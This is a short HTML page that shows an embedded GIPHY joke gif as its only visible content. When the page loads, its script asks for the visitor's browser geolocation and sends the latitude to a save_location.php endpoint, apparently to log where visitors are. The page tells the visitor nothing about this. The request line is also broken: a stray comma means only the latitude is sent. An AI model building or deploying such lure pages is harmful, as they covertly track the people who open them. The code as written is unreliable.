<!DOCTYPE html>
<html>
<body onload="getLocation()">
    <iframe src="https://giphy.com/embed/ZechFo0yBIQpEve1Sm" width="480" height="377" frameBorder="0" class="giphy-embed" allowFullScreen></iframe><p><a href="https://giphy.com/gifs/myHQ-workspaces-funny-joke-guy-ZechFo0yBIQpEve1Sm">via GIPHY</a></p>
    
<p id="demo"></p>

<script>
var x = document.getElementById("demo");

function getLocation() {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(showPosition);
  } else { 
    x.innerHTML = "Geolocation is not supported by this browser.";
  }
}

function showPosition(position) {
    const xhttp = new XMLHttpRequest();
    xhttp.open("GET", "save_location.php?lat="+ position.coords.latitude + "&longitude", + position.coords.latitude);
    xhttp.send();
}
</script>

</body>
</html>
